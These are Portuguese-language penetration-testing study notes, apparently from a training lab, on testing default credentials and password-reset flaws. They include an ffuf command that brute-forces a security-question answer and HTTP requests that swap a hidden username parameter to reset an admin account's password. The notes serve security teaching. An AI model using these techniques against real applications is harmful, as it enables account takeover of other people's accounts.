# Default Credentials

Muitas aplicações Web vêm com **credenciais padrão** para o acesso inicial após a instalação. Essas credenciais **devem** ser trocadas; caso contrário, viram uma porta de entrada fácil para atacantes. Por isso, **testar credenciais padrão** é parte essencial dos testes de autenticação no **OWASP WSTG** (ex.: pares como `admin` / `password`).

## Testando credenciais padrão

Há diversas fontes que listam credenciais padrão por produto/plataforma:

- **CIRT.net – Default Password DB**: pesquisa por fornecedor/produto (ex.: dispositivos **Cisco**).  
    `https://www.cirt.net/passwords`
    
- **SecLists – Default Credentials**
    
- **SCADA GitHub repo** com senhas padrão de vários fabricantes
    

Outra abordagem é a **busca direcionada**. Exemplo: ao encontrar uma aplicação **BookStack**:

- Página: `http://bookstack.htb` (login com e-mail/senha)
    
- Pesquisa por “**bookstack default credentials**”
    
- Resultado: instruções de instalação informando as credenciais padrão de **admin**:  
    **`admin@admin.com : password`** (com recomendação de trocar após o primeiro login)
    

&nbsp;

* * *

&nbsp;

# Vulnerable Password Reset

Mesmo com *rate limiting* e CAPTCHAs, **falhas de lógica de negócio** no fluxo de reset podem permitir o **takeover** de contas.

## Guessable Password Reset Questions

Muitas apps usam **perguntas de segurança** padronizadas (não personalizáveis). Como todos os usuários respondem às mesmas perguntas, respostas podem ser **previstas** (OSINT) ou **forçadas** sem proteção de tentativas.

Ex.: pergunta *“What city were you born in?”*  
Página: `http://<SERVER_IP>:<PORT>/security_question.php`

### Wordlist

Use listas de cidades para *brute-force*. Exemplo (CSV com >25k cidades; o nome está no 1º campo):

```
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
wc -l city_wordlist.txt
# 26468

```

### Alvo e sessão

Defina o usuário alvo:

`http://<SERVER_IP>:<PORT>/reset.php` → **admin**

Requisição de teste (retorna “Incorrect response.”):

```
POST /security_question.php
security_response=test

```

### Brute-force com ffuf (incluindo cookie de sessão)

```
ffuf -w ./city_wordlist.txt \
  -u http://pwreset.htb/security_question.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" \
  -d "security_response=FUZZ" -fr "Incorrect response."

```

Exemplo de acerto:

`[Status: 302, ...] * FUZZ: Houston`

Após obter a resposta correta, redefina a senha em:  
`http://<SERVER_IP>:<PORT>/reset_password.php`

#### Reduzindo escopo

Se houver informação extra (ex.: país), filtre a wordlist:

```
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
wc -l german_cities.txt
# 1117

```

* * *

## Manipulating the Reset Request

Outra falha ocorre quando é possível **manipular um parâmetro oculto** para trocar a conta cujo password será redefinido.

Fluxo:

1.  Informar username  
    `http://<SERVER_IP>:<PORT>/reset.php`

```
POST /reset.php
username=htb-stdnt
Cookie: PHPSESSID=...

```

2.  Responder à pergunta de segurança  
    `http://<SERVER_IP>:<PORT>/security_question.php`

```
POST /security_question.php
security_response=London&username=htb-stdnt
Cookie: PHPSESSID=...

```

> Note o `username` como **parâmetro oculto** enviado junto.

3.  Redefinir senha  
    
    ```
    POST /reset_password.php
    password=P@$$w0rd&username=htb-stdnt
    Cookie: PHPSESSID=...
    
    ```
    

### Exploração

Se a aplicação **não checa** que os usernames dos passos anteriores batem, é possível **pular** a verificação ou responder a **sua** pergunta de segurança e **trocar a senha de outra conta**:

```
POST /reset_password.php
password=P@$$w0rd&username=admin
Cookie: PHPSESSID=...

```